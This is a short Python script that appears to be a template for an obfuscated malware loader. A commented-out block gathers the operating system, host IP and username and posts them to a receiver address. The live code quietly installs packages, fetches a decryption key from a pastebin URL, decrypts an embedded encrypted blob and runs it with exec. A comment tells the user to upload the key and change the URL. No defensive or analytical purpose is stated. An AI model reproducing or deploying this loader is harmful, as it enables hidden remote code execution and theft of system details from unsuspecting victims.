"""
import subprocess, sys, socket, platform, os, base64
import requests
data={'os_name': platform.system(),'os_ver': platform.release(), 'host_ip': socket.gethostbyname(socket.gethostname()), 'user': os.getlogin()}
try:requests.post('http://0.0.0.0:8080/receiver', json=data)
except Exception as e:print(e)
"""

"""
Paste this key to pastebin and chage pastebin url
key = b'2GkrCIFkxKyzUX78xkvQe9jeHKw9QIy6KCPZIz5LzKo='
"""

import base64, subprocess, sys
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--quiet', 'requests', 'cryptography'])
from requests import get
from cryptography.fernet import Fernet
f = Fernet(bytes(get('https://pastebin.com/raw/<url>').text.encode("utf-8")))
exec(f.decrypt(b'gAAAAABlTji-x9vIDOFeF7pIV5MXYC1BZiNRHkw8G3bRtIpk_donKR1UxT6_7X-L-gVf-YvVmy1kVbmNxBhvlG1cEOo0wW7XoUj57D1CQJAlzr1JKuLzVrmNEwoYbs4_85Zdii24GqAlh5gzsAfAtVO5QjNDiEjOPTnFx3ddjZCK1wRhdL8wwZfNJnSAlSj7ZVCBalJl7wvlXPR0r-iya0QK6QHFA9LK_qJlFLhAXk7p3JL9ZPRG8fG8Y9eW5JAD_Olkb7UrRUr9YbGHw6kcYzfx5YWnRg3wXU6-su2HHzU8CNW0mTPwqF_npr8KE6nKLJxsm5nS36EeVO9NKStLKw-57h4ERKpV6y7azhRwpjxzFq28M0x6czO_bgQn1OkwHT97xaDHknkW7ic3lJ1g1w4UAsjIZKrlVgt3XkJAjAuMZ3e4E9WSBxklOPftHiohHFtpblsbKD4etguPhrFVLx_n5xFVCVGCBRK6yzNDb0GRMwRl7Ya-NjE='))